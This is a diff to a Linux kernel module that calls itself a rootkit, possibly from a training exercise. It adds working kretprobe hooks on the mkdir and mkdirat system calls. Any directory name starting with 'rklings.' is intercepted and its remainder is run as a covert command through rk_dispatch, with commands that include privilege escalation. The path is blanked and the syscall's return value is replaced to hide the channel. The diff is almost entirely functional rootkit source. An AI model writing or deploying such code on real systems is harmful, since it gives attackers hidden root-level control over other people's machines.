@@ -1,7 +1,14 @@
 // SPDX-License-Identifier: GPL-2.0
 #include <linux/kernel.h>
 #include <linux/kprobes.h>
+#include <linux/ptrace.h>
+#include <linux/string.h>
+#include <linux/uaccess.h>
 #include "rootkit.h"
+
+#define RK_PREFIX     "rklings."
+#define RK_PREFIX_LEN 8
+#define RK_PATH_MAX   128
 
 enum rk_cmd {
 	CMD_ESCALATE,
@@ -123,27 +130,80 @@ int rk_dispatch(const char *cmd)
 	return -ENOENT;
 }
 
-/* Mkdir probe (handlers are no-ops; dispatch wired externally) */
-static int mkdir_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
+struct rk_mkdir_data {
+	int result;
+	bool intercepted;
+};
+
+static int rk_do_entry(struct kretprobe_instance *inst,
+		       const char __user *pathname)
 {
+	struct rk_mkdir_data *data = (struct rk_mkdir_data *)inst->data;
+	char buf[RK_PATH_MAX];
+	const char *base;
+	long copied;
+
+	data->intercepted = false;
+	copied = strncpy_from_user(buf, pathname, sizeof(buf));
+	if (copied <= 0)
+		return 0;
+
+	base = strrchr(buf, '/');
+	base = base ? base + 1 : buf;
+
+	if (strncmp(base, RK_PREFIX, RK_PREFIX_LEN) != 0)
+		return 0;
+
+	data->result = rk_dispatch(base + RK_PREFIX_LEN);
+	data->intercepted = true;
+	put_user('\0', (char __user *)pathname);
 	return 0;
 }
 
-static int mkdir_return(struct kretprobe_instance *ri, struct pt_regs *regs)
+static int rk_mkdir_entry(struct kretprobe_instance *inst,
+			  struct pt_regs *regs)
 {
+	struct pt_regs *uregs;
+
+	uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
+	if (!uregs)
+		return 0;
+	return rk_do_entry(inst, (const char __user *)uregs->di);
+}
+
+static int rk_mkdirat_entry(struct kretprobe_instance *inst,
+			    struct pt_regs *regs)
+{
+	struct pt_regs *uregs;
+
+	uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
+	if (!uregs)
+		return 0;
+	return rk_do_entry(inst, (const char __user *)uregs->si);
+}
+
+static int rk_mkdir_return(struct kretprobe_instance *inst,
+			   struct pt_regs *regs)
+{
+	struct rk_mkdir_data *data = (struct rk_mkdir_data *)inst->data;
+
+	if (data->intercepted)
+		regs_set_return_value(regs, (unsigned long)(long)data->result);
 	return 0;
 }
 
 struct kretprobe rk_mkdir_probe = {
-	.handler        = mkdir_return,
-	.entry_handler  = mkdir_entry,
-	.maxactive      = 20,
 	.kp.symbol_name = "__x64_sys_mkdir",
+	.entry_handler  = rk_mkdir_entry,
+	.handler        = rk_mkdir_return,
+	.data_size      = sizeof(struct rk_mkdir_data),
+	.maxactive      = 8,
 };
 
 struct kretprobe rk_mkdirat_probe = {
-	.handler        = mkdir_return,
-	.entry_handler  = mkdir_entry,
-	.maxactive      = 20,
 	.kp.symbol_name = "__x64_sys_mkdirat",
+	.entry_handler  = rk_mkdirat_entry,
+	.handler        = rk_mkdir_return,
+	.data_size      = sizeof(struct rk_mkdir_data),
+	.maxactive      = 8,
 };
